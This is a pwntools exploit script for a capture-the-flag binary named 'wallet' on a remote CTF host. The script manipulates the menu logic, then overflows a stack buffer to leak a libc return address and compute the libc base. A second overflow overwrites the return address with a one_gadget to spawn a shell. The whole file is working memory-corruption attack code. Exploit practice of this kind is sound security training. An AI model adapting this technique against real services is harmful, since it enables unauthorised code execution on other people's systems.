from pwn import *

context.log_level = 'debug'
# p = process("../system_challenge/wallet/share/wallet")
p = remote("pwn.isangxcaution.xyz", 10070)
libc = ELF("./libc-2.31.so")
e = ELF("./wallet")


def slog(symbol, addr): return success(symbol + ": " + hex(addr))


def buy():
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("Choost Your Item :")
    p.sendline("3")


def work():
    p.recvuntil("> ")
    p.sendline("2")


def lend(percentage):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("Input Percentage: ")
    p.sendline(str(percentage))


# make money 0
work()
for i in range(0, 6, 1):
    lend(9)

# Trigger - leak libc base
p.recvuntil("Don't run!! What's Youre name?")

payload = b"A"*0x28
payload += b"B"*0x10

p.send(payload)
p.recvuntil(payload)

# leak libc base
libc_start_243 = u64(p.recvn(6)+b"\x00"*2)
libc_start_main = libc_start_243 - 243
libc_start_main_offset = libc.symbols["__libc_start_main"]
libc_base = libc_start_main - libc_start_main_offset

slog("libc_start_243 :", libc_start_243)
slog("libc_start_main :", libc_start_main)
slog("libc_start_main_offset:", libc_start_main_offset)
slog("libc_base :", libc_base)

# get one gadget address
og = 0xe3b01
og_addr = libc_base + og

slog("onegadget_offset :", og)
slog("onegadget_addr :", og_addr)

p.recvuntil("Tell Me One More. What?")
payload = b"E"*0x28
payload += b"G"*0x10
payload += p64(og_addr)

p.send(payload)

# make count 0 for escape while loop
lend(100)

p.interactive()
